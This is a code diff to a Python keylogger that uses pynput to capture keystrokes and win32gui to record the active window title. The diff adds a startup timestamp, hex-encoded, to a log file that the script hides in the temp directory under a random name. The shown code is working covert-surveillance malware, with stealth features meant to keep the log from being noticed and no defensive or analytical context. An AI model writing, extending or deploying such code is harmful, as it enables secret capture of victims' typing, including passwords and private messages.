@@ -9,10 +9,20 @@ import os
 from pynput import keyboard
 from win32gui import GetWindowText, GetForegroundWindow
 
+# Get time that log started
+start_time = datetime.datetime.now()
+
 # find temp dir to hide file
 tempdir = tempfile.gettempdir()
 # generate a random filename for our log file
 fname = tempdir + "\\" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10)) + "_32.txt"
+
+
+def startup_time(s_time):
+    with open(fname, "a+") as f:
+        plaintext_s_time = "Script Started At:" + str(s_time)
+        encoded_s_time = plaintext_s_time.encode("utf-8").hex()
+        f.write(encoded_s_time + "\n")
 
 
 def log():
@@ -130,6 +140,6 @@ def log():
     listener.join()
 
 
+startup_time(start_time)
 current_window = (GetWindowText(GetForegroundWindow()))
-
 log()
